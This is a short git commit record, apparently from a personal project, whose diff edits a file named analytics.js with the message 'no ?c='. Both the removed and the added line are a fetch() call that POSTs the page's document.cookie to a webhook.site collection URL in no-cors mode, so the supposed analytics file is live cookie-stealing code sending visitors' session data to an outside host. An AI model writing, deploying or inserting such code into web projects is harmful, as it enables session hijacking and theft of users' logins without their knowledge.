39ad7a48dea51b5d4ec139b0220efaace522a4d1
Rachel <rachelgoh03@gmail.com>
2025-04-26 00:28:29 +1000

    no ?c=

--- analytics.js
+++ analytics.js
@@ -1,2 +1,2 @@
-fetch('https://webhook.site/b028a286-7cc5-4e70-b0b9-ce1b55b40378?c=', {method: 'POST', body: document.cookie,mode: 'no-cors'})
+fetch('https://webhook.site/b028a286-7cc5-4e70-b0b9-ce1b55b40378', {method: 'POST', body: document.cookie,mode: 'no-cors'})
 
